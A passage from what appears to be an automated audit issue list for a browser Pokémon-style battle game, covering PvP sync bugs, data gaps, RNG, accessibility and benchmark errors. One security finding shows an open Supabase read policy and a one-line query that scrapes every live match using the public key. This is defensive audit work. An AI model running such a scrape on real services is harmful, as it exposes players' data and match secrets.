**Repro**: Spec promises ~15% chance on Basic Trainer route battles post-unlock that the trainer offers to wager 1 mon. Win → take their worst; lose → give your best. Never fires in any current Basic Trainer encounter.

**Blast radius**: §8 ordering rule `itinerary → wild → wager prompt → trainer` is unverifiable since wager hook missing. `_compareTeamSlotForWager` (worst/best helpers spec'd in §6) absent; spec's flow-checklist row "Full PC + party → do not show wager if winning transfer has nowhere to go" also unimplemented.

**Fix sketch**: Add `sm.pendingWager` to save schema (migrateStoryPreV20), implement `_rollWagerForRouteBattle(eventIdx)` 15% trigger inside `proceedToNextBattle`, write `_pickFoeWorstSlot` / `_pickPlayerBestSlot` helpers near `rollTrainerTeam` (~32290), and add accept / decline UI in the battle intro flow.

**Verification**: Force `sm.pendingWager = true` via dev seed, fight a Basic Trainer, see wager prompt; on win the foe's worst grade mon transfers to PC.

---

## <a id="ISSUE-012"></a> ISSUE-012: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

---
id: ISSUE-012
severity: P1
category: bug
anchor_symbol: pushDataQueue
current_line_hint: ~463
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16
confidence: high
status: open
---

**Title**: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

**Evidence**:
```js
// online-pvp.js L463-494
pushData(patch, existingData) {
    const sb = getClient();
    if (!sb || !roomId) return Promise.resolve();
    const op = pushDataQueue.then(() => this._pushDataImpl(patch, existingData));
    pushDataQueue = op.catch((e) => {
        console.warn('[OnlinePvP] pushData queue', e);     // <-- swallows, queue advances
    });
    return op;                                              // caller can await rejection,
                                                            // but no caller actually catches.
},
async _pushDataImpl(patch, existingData) {
    // ...
    const { error: upErr } = await sb.from('pvp_rooms')
        .update({ data, updated_at: new Date().toISOString() }).eq('id', roomId);
    if (upErr) console.warn('[OnlinePvP] pushData update failed', upErr);  // <-- not thrown
},
```

**Repro**: Pull the network on the host mid-battle. `pushData({ battle, ... }, prev)` at L547/L571/L630 await the rejection (or in the upErr case, it returns normally because the `update` error is only console.warned), so callers don't see the failure. The guest never receives the seq bump, the host's local `state` reflects "p1 picked move", and the next turn proceeds locally — desync. Worse: if `_pushDataImpl` throws (e.g., the select at L478 fails), the queue's `.catch()` healing means the *next* `pushData` proceeds as if nothing happened, with no retry of the lost write.

**Blast radius**: All host-authoritative updates: draft progression (L399), draft deadline (L406, L410), p1/p2 pick submission (L547, L571), turn resolution (L630), end-of-round wins (L654), battle start (L716). The serialization is correct (queue preserves order), but the failure-handling contract is broken in two ways: (1) `update` errors at L493 are not thrown, so the queued op resolves "successfully" with bad data, and (2) `select` errors at L481-485 are thrown but only `console.warn`ed by the queue, with no upstream signal — `pushData(...)`'s return value rejects but every callsite uses `await this.pushData(...)` without a `try/catch`, so the rejection bubbles all the way up to the function that called `handlePvPPlayTurn`/`_hostRunResolution`, where it's *also* not caught (those functions don't try-wrap pushData), and ultimately reaches the user's click handler with an unhandled rejection.

**Fix sketch**: (a) Throw on `upErr` at L493 (`if (upErr) throw upErr`) so the queue knows the write actually failed. (b) Add a `pushDataFailed` callback on the OnlineBattle object that signals "we lost sync — UI should show a 'reconnecting' banner". (c) On select/update failure, retry once with exponential backoff before declaring the write lost. (d) Every call site that needs durable confirmation (turn submission, end of round) should `try/catch` the await and surface an inline error to the player ("network hiccup — your move was not sent").

**Verification**: Add a test that injects an `update` error response and asserts: (1) `pushData(patch).then(...).catch(handler)` reaches `handler`, (2) a follow-up `pushData(patch2)` still runs (queue doesn't stall — important), and (3) a `pushDataFailed` event fires with both patches' info.

---

## <a id="ISSUE-013"></a> ISSUE-013: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

---
id: ISSUE-013
severity: P1
category: security
anchor_symbol: pvp_rooms_select
current_line_hint: ~31
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: c6b9e9e968bd
confidence: high
status: open
---

**Title**: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L31-35
drop policy if exists "pvp_rooms_select" on public.pvp_rooms;
create policy "pvp_rooms_select"
  on public.pvp_rooms for select
  to anon, authenticated
  using (true);
```

**Repro**: With the publishable key (which is hardcoded in `online-config.js` and shipped to every browser), an attacker runs `client.from('pvp_rooms').select('code, data').range(0, 999)` and gets every live room's code, draft picks (p1/p2 pool, p1/p2 draft), p1_pick/p2_pick (the move each player just selected), and `battle_log_html` (the full battle commentary). Subscribing to `postgres_changes` on `pvp_rooms` gives realtime spectator access to every match without joining.

**Blast radius**: Competitive integrity for ranked-style play (other player can see what you drafted before you commit your pick). Privacy: display names are tied to rooms; an attacker can map "Trainer Alice" to "Trainer Bob" across many matches. Codes are leaked, so anyone watching can join as the second player into a room that hasn't filled yet (though the atomic `try_join_pvp_room` RPC ensures only one guest can actually claim it).

**Fix sketch**: Restrict SELECT to participants. Two approaches: (a) require a token-bearing RPC (`get_room_for_participant(p_room_id, p_token)`) that returns the row only if `p_token` matches `data->>'host_token'` or `data->>'guest_token'`; client-side `select` is denied. (b) Keep SELECT permissive on the `code` column only (so join-by-code works) and gate the `data` column with a column-level grant — but PostgREST + jsonb makes this awkward. (a) is cleaner.

**Verification**: From a non-participant client, `select * from pvp_rooms` must return 0 rows (or only rows where the requesting token matches).

---

## <a id="ISSUE-014"></a> ISSUE-014: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

---
id: ISSUE-014
severity: P1
category: bug
anchor_symbol: remoteRowQueue
current_line_hint: ~496
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 564feb239c3e
confidence: high
status: open
---

**Title**: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

**Evidence**:
```js
// online-pvp.js L496-508
_onRemoteRow(newRow) {
    if (!newRow) return;
    remoteRowQueue = remoteRowQueue
        .then(async () => {
            const d = newRow.data || {};
            if ((d.seq || 0) <= lastRemoteSeq) return;
            lastRemoteSeq = d.seq || lastRemoteSeq + 1;
            if (typeof global.onOnlineRoomData === 'function') {
                await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
                //          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                //          unbounded — onOnlineRoomData calls startBattle() at L14711,
                //          guestApplyBattleStart() at L14716, guestApplyBattleBlob()
                //          at L14728, consumeRemoteForHost() at L14724 — any UI
                //          promise that never resolves locks the whole channel.
            }
        })
        .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
},
```

**Repro**: In `guestApplyBattleStart` (L743), the function calls `global.AudioSystem.startNewBattle()` which is wrapped in try/catch — but what about `global.updateUI()` at L768 or `global.applyBattleLogDockClass()` at L773? If any of those `await`s an animation promise or a modal close that depends on user interaction, the queue chain blocks until that promise settles. From that moment on, every future `_onRemoteRow` (every pushData echo, every opponent move) sits in the queue waiting. The realtime subscription is still receiving events, but they pile up behind a stuck `await`. The host has no signal that the guest is stuck. The integration test at `tests/integration/pvp-stub.test.js:75-90` validates serialization but doesn't exercise the hang-recovery path.

**Blast radius**: The whole live-sync layer freezes on a single bad handler invocation. The user sees their input go through (local state changes), but the opponent's responses never appear. Symptom: "the game froze, my opponent's screen says it's their turn but they say it's mine."

**Fix sketch**: Race the handler against a timeout: `await Promise.race([handler, new Promise((_, rej) => setTimeout(() => rej(new Error('onOnlineRoomData timeout')), 30_000))])`. On timeout, log loudly, possibly tear down the channel and reconnect (the `_subscribe` path is idempotent — `removeChannel` then re-create). Alternatively, decouple the queue from the handler: the queue's job is to enforce sequence ordering, not to wait on UI; once the seq check passes, fire-and-forget the handler call with its own error boundary, so a hung handler never blocks subsequent seq updates.

**Verification**: Add a test that mocks `global.onOnlineRoomData = () => new Promise(() => {})` (never resolves), call `_onRemoteRow({ data: { seq: 1 } })`, then `_onRemoteRow({ data: { seq: 2 } })`, then wait 35s. Assert that the queue did *not* block the seq:2 row's handler (or that a reconnect was triggered).

---

## <a id="ISSUE-015"></a> ISSUE-015: `No Item` sentinel string used in 11 build slots is absent from `data/items.json`

---
id: ISSUE-015
severity: P1
category: data
anchor_symbol: resolveCsvBuildEntry
file: data/builds/gen8.json
agents: [data-integrity-auditor]
fingerprint: 5359999bcf35
confidence: high
status: open
---

**Title**: `No Item` sentinel string used in 11 build slots is absent from `data/items.json`

**Evidence**:
```json
"Vileplume": { "nu": { "Defensive": {"item": ["Black Sludge", "No Item"], ...} } }
"Ninjask":   { "pu": { "Swords Dance": {"item": ["Heavy-Duty Boots", "No Item"], ...} } }
"Giratina":  { "godlygift": { "Wall": {"item": ["Leftovers", "No Item"], ...} } }
```

**Repro**: `node scripts/debug/data-validator.mjs` reports `[P1] 1 items referenced by builds are missing from items.json — No Item (11 build(s))`. Affects gen8.json (6) and gen9.json (5).

**Blast radius**: When `makeBuild` rolls a slot whose `item` array picks `"No Item"`, the mon's `item` becomes the literal string `"No Item"`. The engine handles this as a sentinel (`battle.html` lines 13134-13136 fall through to `'No Item'` as a default), so combat works. But: the tooltip dictionary populated from `items.json` has no entry, so any UI showing the mon's held item will not render a tooltip, and any code that does `itemsJSON[norm('No Item')]` for legality/effects gets `undefined` and may treat it as a missing entry.

**Fix sketch**: Either (a) add a single placeholder entry in `data/items.json` (gen 1, `name: "No Item"`, `shortDesc: "No held item."`) so consumers can look it up uniformly, or (b) migrate the 11 build slots to use `null` / omit the alternative entirely and document that "no held item" is encoded as absence rather than a sentinel string. Option (b) is more invasive but cleaner.

**Verification**: Re-run `node scripts/debug/data-validator.mjs`; the missing-items finding should drop to 0. Spot-check a build that previously had `"No Item"` in its item array (e.g., Vileplume `nu/Defensive`) and confirm the rolled mon gets the alternative held item when "No Item" was selected.

---

## <a id="ISSUE-016"></a> ISSUE-016: Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing

---
id: ISSUE-016
severity: P1
category: inconsistency
anchor_symbol: traderOfferByCity
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 5ccd1b40734e
confidence: high
status: open
---

**Title**: Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing

**Evidence**:
```
$ grep -niE 'traderOffer|enterTrader|tradeMon|fixedTrade|cityTrader|traderHouse' battle.html
(no matches)
```

**Repro**: Visit City4 on first arrival (event idx 26) or post-gym (event idx 29) — no Trader NPC offers a same-grade fixed trade. Spec calls for a single City4 trader generating a 1:1 same-grade species swap, frozen on first generation, both species from enabled gens.

**Blast radius**: Smallest scope from the spec checklist (§17.6 — "half-day"), but still unshipped after 6+ months. Could land independently of itinerary / wager / black market.

**Fix sketch**: Add `sm.traderOfferByCity = {}` save field, `_generateTraderOffer(cityIdx, enabledGens)` near `_pickStarterPartner` (~36819), render the City4 Trader button alongside Safari Zone in `renderCityActions`.

**Verification**: Enter City4 on first visit; Trader NPC offers e.g. Ralts ↔ Riolu (both G2); accept swaps the party slot; revisit City4 — same frozen offer (or marked traded).

---

## <a id="ISSUE-017"></a> ISSUE-017: Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop

---
id: ISSUE-017
severity: P1
category: bug
anchor_symbol: turn-resolution
current_line_hint: ~19368
file: battle.html
agents: [consistency-auditor]
fingerprint: 91037ef383da
confidence: high
status: open
---

**Title**: Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop

**Evidence**:
```js
// L19353-19354 (Quick Claw — should be deterministic in story)
if (_pItemActiveQC && state.pActive.item === "Quick Claw" && Math.random() < 0.2) { pPri += 0.4; ... }
if (_fItemActiveQC && state.fActive.item === "Quick Claw" && Math.random() < 0.2) { fPri += 0.4; ... }
// L19368 (speed tie)
else if (fSpe === pSpe) pGoesFirst = Math.random() > 0.5;
// L19762 (locking move turn count — Outrage/Thrash/Petal Dance)
attacker.volatile.lockTurns = 1 + Math.floor(Math.random() * 2);
// L20077 (Sleep Talk picks a random move)
let sleepTalkPick = validMoves[Math.floor(Math.random() * validMoves.length)];
```

**Repro**: Story battle, seed it, give the foe a Quick-Claw holder. Two replays of the same seeded turn will not see the same Quick-Claw procs. Speed-tie between two mons with the same Speed: ditto.

**Blast radius**: Order-of-actions is the highest-leverage RNG in the engine — first-strike flips entire battles. Speed-tie and lock-turn divergence propagate through the rest of the run.

**Fix sketch**: At the top of the turn-resolution closure that owns these branches, bind `_rng = (sm && sm.active) ? storyRngNext : Math.random` and use it for every priority/turn-count decision. Lock-turn count and Sleep Talk picks should also be on `_rng`.

**Verification**: Seeded replay where both sides field equal-Speed mons; assert action order matches across runs. Quick-Claw-holder seeded fight: assert proc/no-proc parity.

---

## <a id="ISSUE-018"></a> ISSUE-018: `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart`

---
id: ISSUE-018
severity: P1
category: data
anchor_symbol: typeChart
current_line_hint: ~9941
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 72e49ce309b5
confidence: high
status: open
---

**Title**: `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart`

**Evidence**:
```js
// battle.html ~9941
const typeChart={"Normal":{...},"Fire":{...}, ... /* 18 entries, no "???" */};

// data/moves.json gen4.curse
{ "type": "???", "desc": "If the user is not a Ghost type, lowers Speed by 1 stage ..." }
```

**Repro**: `node -e "const moves=JSON.parse(require('fs').readFileSync('/home/user/battle/data/moves.json','utf8')); for (const g of Object.keys(moves)) for (const k of Object.keys(moves[g])) if (moves[g][k].type==='???') console.log(g,k);"` prints `1 bide` and `4 curse`. Grep the typeChart literal: `???` is absent.

**Blast radius**: The live engine only loads gen9 moves (`movesJSONOrig['9']`), where `curse` is `Ghost` and `bide` is `Normal`, so today the runtime never observes a `???` type. However, any tooling that reads earlier gens from `moves.json` (e.g., a dex/format browser, a learnset preview that walks the inheritance chain) will look up `typeChart["???"]` and receive `undefined`, causing all subsequent damage-multiplier math to fall back to `1` silently. This is also a load-bearing assumption for any future gen-toggle feature.

**Fix sketch**: Either remove the gen4 `curse.type === "???"` data (replacing it with the Showdown-canonical `Normal` typing it had in gen4) or add a `"???"` entry to `typeChart` with all neutral (`1×`) effectiveness so legacy-data consumers don't get `undefined`. The first option matches engine behavior; the second preserves the original Showdown export verbatim.

**Verification**: After the fix, `Object.keys(typeChart).includes('???')` is true (option B) or `moves.json` has no `???` types (option A). Either way, `node scripts/debug/data-validator.mjs` should pass without warnings about the typeless move.

---

## <a id="ISSUE-019"></a> ISSUE-019: 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js

---
id: ISSUE-019
severity: P2
category: refactor
anchor_symbol: _hostRunResolution
current_line_hint: ~588
file: online-pvp.js
agents: [consistency-auditor]
fingerprint: 52cc0edfbc71
confidence: high
status: open
---

**Title**: 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js

**Evidence**:
```js
// L478, L534, L559, L610, L639, L672, L710 — all match this shape:
const { data: row, error: rowErr } = await sb.from('pvp_rooms').select('data').eq('id', roomId).single();
if (rowErr || !row || row.data == null) {
    console.warn('[OnlinePvP] <label> fetch', rowErr);
    return;
}
const prev = row.data;
```

**Repro**: `grep -nE "select\\('data'\\)\\.eq\\('id', roomId\\)\\.single\\(\\)" online-pvp.js` returns 7 sites with near-identical follow-on error handling.

**Blast radius**: Maintenance only — if Supabase API surface changes, every site needs the same edit. Risk of one fetch getting fixed and others diverging. No runtime bug.

**Fix sketch**: Extract a single `async function _fetchRoomData(label)` helper that returns `{ data, error }` or `null` on failure, logs once, and lets call sites focus on logic. Probably 10-15 lines of shared code.

**Verification**: Run existing online-PvP integration tests after refactor; no behavior change expected.

---

## <a id="ISSUE-020"></a> ISSUE-020: Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it

---
id: ISSUE-020
severity: P2
category: a11y
anchor_symbol: _maybeShowSaveToast
current_line_hint: ~30847
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b17b3f418817
confidence: high
status: open
---

**Title**: Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it

**Evidence**:
```js
// _maybeShowSaveToast at ~30847
const el = document.createElement('div');
el.className = 'story-save-toast';
el.textContent = '💾 Saved';
el.style.cssText = 'position:fixed;left:50%;bottom:18px;…';
document.body.appendChild(el);   // ← appends to <body>, NOT #toast-host
```

The toast helper that the rest of the game uses (`window.showToast`, ~8722) appends into `#toast-host` (line 7389) which has `aria-live="polite"`. `_maybeShowSaveToast` constructs its own DOM and appends straight to `document.body`, so the toast is never inside a live region and never announced. The visual styling also bakes in `pointer-events:none` so SR users can't even pull focus to it.

**Repro**: Run a story battle to completion with a screen reader on; the visual "💾 Saved" toast renders, but VoiceOver/NVDA stays silent.

**Blast radius**: Save events are the only confirmation a player gets that their progress persisted (the localStorage write is fire-and-forget). Blind story-mode players have no audible confirmation of autosave. Affects every transition: battle end, enterCity, renderActions, etc.

**Fix sketch**: Append the toast element into `document.getElementById('toast-host')` instead of `document.body`, or add `role="status" aria-live="polite"` directly on the element before appending. Keep the throttle + `pointer-events:none`.

**Verification**: After fix, `grep -A2 _maybeShowSaveToast battle.html` shows the host insertion. Run with a screen reader → "Saved" is announced once per ≥3s window.

---

## <a id="ISSUE-021"></a> ISSUE-021: Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC

---
id: ISSUE-021
severity: P2
category: a11y
anchor_symbol: _showStoryTutorialScene
current_line_hint: ~34943
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 3bc8f10d137b
confidence: high
status: open
---

**Title**: Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC

**Evidence**:
```js
// _showStoryTutorialScene at ~34943
const ov = document.createElement('div');
ov.className = 'story-tutorial-overlay';   // no role, no aria-modal
…
ov.querySelector('button').onclick = function (e) { e.stopPropagation(); dismiss(); };
ov.onclick = function (e) { if (e.target === ov) dismiss(); };
document.body.appendChild(ov);             // no autofocus on Continue
```

The full-screen tutorial overlay (Prof. Oak intros for first-trainer-battle, first-wild, first-mart, etc. in `STORY_TUTORIAL_SCENES`) is a `<div>` with no `role="dialog"`, no `aria-modal="true"`, no `aria-labelledby` pointing at the nameplate, no focus management (focus stays on whatever button triggered the overlay), and no `Escape` key handler. Click-outside dismiss + auto-focus + ESC are the standard expectations for a story-blocking modal.

**Repro**: Trigger `playStoryTutorial('firstWild', …)` (first wild encounter). Open with keyboard — Tab does not enter the dialog; Esc does nothing; SR sees a context-less paragraph dropped into the page.

**Blast radius**: All 10+ first-time-mechanic scenes (firstTrainerBattle, firstWild, firstSafariCatch, firstMart, firstDept, firstSafari, firstCasino, firstPokemonCenter, …). These are the first impression for new players, so the keyboard/SR experience here is load-bearing for onboarding.

**Fix sketch**: Set `ov.setAttribute('role','dialog')` and `aria-modal="true"`; give the nameplate `id="story-tutorial-name-<uid>"` and `aria-labelledby` the overlay; `requestAnimationFrame(() => ov.querySelector('button').focus())`; add a keydown listener for `Escape`/`Enter` that calls `dismiss()`. Remove the listener on dismiss.

**Verification**: Tab into the overlay; SR announces "Your First Fight, dialog". Esc closes. Focus returns to the previously-focused element.

---

## <a id="ISSUE-022"></a> ISSUE-022: Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit

---
id: ISSUE-022
severity: P2
category: perf
anchor_symbol: benchMemoryGrowth
current_line_hint: 65
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: a20dbf90774a
confidence: high
status: open
---

**Title**: Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit

**Evidence**: `scripts/debug/_repro/mem-growth.mjs` run with `--expose-gc`, 200 turns, sampling every 10:
```
heap @ turn  0  = 82.5 MB
heap @ turn 100 = 84.4 MB
heap @ turn 190 = 85.5 MB

Linear fit: heap = 0.0159 * turn + 82.50   R² = 0.712
Heap delta over 200 turns: 5.0 MB
Avg per-turn heap growth: 25.52 KB
```
Slope is essentially flat; R² = 0.712 indicates the linear trend explains only ~70% of variance — the rest is GC noise. Across 200 turns the heap moves 3 MB net, which is well within normal GC fluctuation for a 80+ MB resident set. **No leak.**

This finding documents the result so future runs have a baseline. Logged as P2 with `confidence: high` because the mandate explicitly asked us to check for quadratic growth across the 60-turn benchmark — the answer is "linear, slope ~0, not a leak", and that null result is worth recording.

**Repro**: `node --expose-gc scripts/debug/_repro/mem-growth.mjs`. Without `--expose-gc` the variance is higher (5–10 MB swings between samples) because GC is unpredictable; with it the trend stabilizes.

**Blast radius**: None. This is a "ruled out" finding, not a defect. If a future change introduces a quadratic-growth bug, this baseline will catch it: 25 KB/turn is the floor; anything > 250 KB/turn (10×) for ≥ 100 turns should be re-classified as P1.

**Fix sketch**: No fix needed. Consider adding a `--expose-gc` recommendation to the `perf-bench.mjs` output (it's already there at line 157) and treating > 250 KB/turn average growth as a regression threshold in CI.

**Verification**: Re-run `node --expose-gc scripts/debug/_repro/mem-growth.mjs` after any change to the turn loop; confirm slope remains < 0.05 MB/turn.

---

## <a id="ISSUE-023"></a> ISSUE-023: `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing

---
id: ISSUE-023
severity: P2
category: perf
anchor_symbol: benchParseMove
current_line_hint: 58
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: c57a28528982
confidence: high
status: open
---

**Title**: `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing

**Evidence**:
```js
// scripts/debug/perf-bench.mjs:58
try { engine.parseMoveEffects(move); } catch (e) { /* malformed entry skipped */ }
```
The real signature is `parseMoveEffects(attacker, defender, move, isPlayer, _bouncedDepth)` (battle.html:24269). Calling with a single arg means `attacker = moveObject`, and the first line `let eff = (move.effectStr || move.eff || "").toLowerCase();` reads `move.effectStr` against `move = undefined` (the original move parameter), throwing `TypeError: Cannot read properties of undefined (reading 'effectStr')`. The harness then crashes after the bench loop is over because the final `catch` doesn't suppress the un-awaited Promise rejection from `parseMoveEffects` being `async`.

**Repro**: `node scripts/debug/perf-bench.mjs` produces `tests/reports/perf.md` with `Median: 1.438 ms 🚨 >2× over target`, then the process crashes with the TypeError above. The 1.438 ms number is the cost of *entering an async function, throwing, and creating a rejected Promise* — not the cost of actually parsing a move.

**Blast radius**: Misleading P2-style red flag in every CI / agent run. A drill-down (see `scripts/debug/_repro/parse-move-drill.mjs`) that calls `parseMoveEffects(attacker, defender, move, true)` correctly across all 950 moves with a valid attacker (Pikachu) and defender (Snorlax) measures a **median of 0.013 ms per call** — about 38× under the 0.5 ms target. parseMoveEffects is not actually slow.

**Fix sketch**: Replace line 58 with a properly-shaped call. The harness already exposes `mkMon`; the bench should set up an attacker, a defender, hook them onto `state.pActive` / `state.fActive`, and call `await engine.parseMoveEffects(attacker, defender, move, true)`. Also drop the `try/catch` swallowing the rejection — silently catching is what hid the bad shape originally. After the fix, the report should show a sub-millisecond median.

**Verification**: After the fix, `node scripts/debug/perf-bench.mjs` should exit cleanly (no TypeError crash after the report write) and the parseMoveEffects median in `tests/reports/perf.md` should be < 0.5 ms.

---

## <a id="ISSUE-024"></a> ISSUE-024: Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path

---
id: ISSUE-024
severity: P2
category: perf
anchor_symbol: benchTurn
current_line_hint: 34
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: 727cad5b6ed7
confidence: high
status: open
---

**Title**: Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path

**Evidence**: 5 trial sets × 30 turns each (`scripts/debug/_repro/multi-bench.mjs`):
```
Boot ms: 2885
Turn loop  (5 trial medians): 16.81, 14.57, 15.20, 16.71, 19.00
Turn loop overall median: 16.75   IQR: 11.98
Turn loop overall max: 78.71
```
Original `perf-bench.mjs` reports the same shape: median 14.15 ms, max 83.62 ms. The agent mandate's "Turn loop median > 100 ms → P2" threshold is **not** hit; the median is fine. But the max being ~5× the median, with IQR ~75% of median, means there's a slow outlier path being taken occasionally.

**Repro**: `node scripts/debug/perf-bench.mjs` produces a max ≥ 80 ms about once per 30-turn batch (seen on 5/5 trials).

**Blast radius**: At 60 fps, a 80 ms hitch is ~5 dropped frames — visible as a stutter when the player presses a move button. In jsdom the cost can't be attributed to layout/paint, so it's a real JS hotspot. Likely candidates: (a) the very-first turn after `reset()` pays one-time costs (RNG re-seed, state-object re-creation, all the volatile-cleanup loops in `playTurn`); (b) Flamethrower's burn-secondary check triggers `applyStatus` with a logMsg cascade; (c) the harness's `await window.playTurn(...)` resolves microtasks at end-of-turn, and one of them is slow.

**Fix sketch**: Add a `console.time('playTurn')` / `console.timeEnd('playTurn')` wrapper around the bench's `await runTurn(...)` and re-run. Cluster the slow turns: are they always turn 0 (cold start), or are they random? If always turn 0, the fix is to drop the first sample. If random, the next step is to wrap `parseMoveEffects`, `applyStatus`, and the post-turn `updateUI` with `console.time` to find the slow branch. Reporting it as P2 because the max latency *would* be user-visible if it occurred in production timing.

**Verification**: Median and max should both be well under the 50 ms harness target. Better: max / median ratio under 3×.

---

## <a id="ISSUE-025"></a> ISSUE-025: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

---
id: ISSUE-025
severity: P2
category: refactor
anchor_symbol: deepClone
current_line_hint: ~67
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: f399b81a21b5
confidence: medium
status: open
---

**Title**: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

**Evidence**:
```js
// online-pvp.js L67-69
function deepClone(o) {
    return typeof structuredClone === 'function' ? structuredClone(o) : JSON.parse(JSON.stringify(o));
}
// Called 11x across the file, on state.pSide/fSide/playerParty/foeParty/p1GimmickIntent
// /p2GimmickIntent/draftGrades/mechanics — i.e. the entire snapshot.
// exportBattleSnapshot at L110-161 already special-cases revealedFoe (Set → Array) at L111-113,
// proving the author knows JSON drops Sets, but only one site was patched.
```

**Repro**: If a future state addition stores `state.fSide.boosts = new Map([['atk', 1]])`, `deepClone(state.fSide)` returns `{ boosts: {} }` under JSON fallback (Map serializes to `{}`) or a real Map under `structuredClone`. Cross-browser test fleet split: Chrome ≥98 gets structuredClone, older WebViews fall through to JSON. Behavior diverges silently. Same goes for `Date` objects (become ISO strings under JSON, stay Date under structuredClone), `undefined` (key dropped under JSON, preserved under structuredClone), and circular refs (JSON throws, structuredClone preserves).

**Blast radius**: Latent — no current state object known to use Set/Map/Date/undefined in the cloned regions. But the `revealedFoe` special-case shows this category of bug already bit once; any future contributor adding a `Map<MoveId, …>` to `pSide` or a `Date` for status-cure-timestamp creates a cross-environment drift bug that only manifests in older Safari/Edge.

**Fix sketch**: (a) Drop the JSON fallback entirely — `structuredClone` has been Safari ≥15.4 / Chrome ≥98 / Firefox ≥94 since early 2022, which is the same browser floor the project targets. (b) Or, replace with a project-specific safe-clone that explicitly handles Set/Map/Date (mirroring `exportBattleSnapshot`'s revealedFoe pattern for all known cases).

**Verification**: Add a unit test: build a state object with `pSide.foo = new Set([1, 2])`, `pSide.bar = new Date('2025-01-01')`, run through `exportBattleSnapshot` → `applyBattleSnapshot`, assert the round-trip preserves both. Today this fails on the JSON path.

---

## <a id="ISSUE-026"></a> ISSUE-026: Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME`

---
id: ISSUE-026
severity: P2
category: inconsistency
anchor_symbol: ELITE_VICTORY_LINES
current_line_hint: ~28371
file: battle.html
agents: [consistency-auditor]
fingerprint: 9da9210ce0f7
confidence: medium
status: open
---

**Title**: Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME`

**Evidence**:
```js
// L28391  ELITE_VICTORY_LINES has:
'Malva':"Malva: \"You snuffed my fire. The next gate awaits.\"",
// But she is the ONLY canonical Elite Four member missing from
// TRAINER_QUOTES_BY_NAME — every other E4 has 3+ intro lines there.
```

**Repro**: Force a Kalos E1 roll (`?seed=…` that picks Kalos), reach E1 — Malva runs the generic 'E1' pool while every other E4 gets a 3-line personal pool.

**Blast radius**: Single character. Easy fix.

**Fix sketch**: Add a `'Malva': [...]` entry next to the other E4 / Kalos block at ~L29516-29519 in `TRAINER_QUOTES_BY_NAME`. Three short fire-themed lines.

**Verification**: Manual playthrough hitting the Kalos E1 slot.

---

## <a id="ISSUE-027"></a> ISSUE-027: Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive

---
id: ISSUE-027
severity: P2
category: dx
anchor_symbol: expandCommaAlternatives
current_line_hint: ~69
file: scripts/debug/data-validator.mjs
agents: [data-integrity-auditor]
fingerprint: 2d5d47372205
confidence: high
status: open
---

**Title**: Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive

**Evidence**:
```js
function expandCommaAlternatives(value) {
  if (!value) return [];
  if (Array.isArray(value)) return value.flatMap(expandCommaAlternatives);  // ← recurses into array
  return String(value).split(',').map(s => s.trim()).filter(Boolean);
}
// caller:
const alternatives = expandCommaAlternatives(raw);
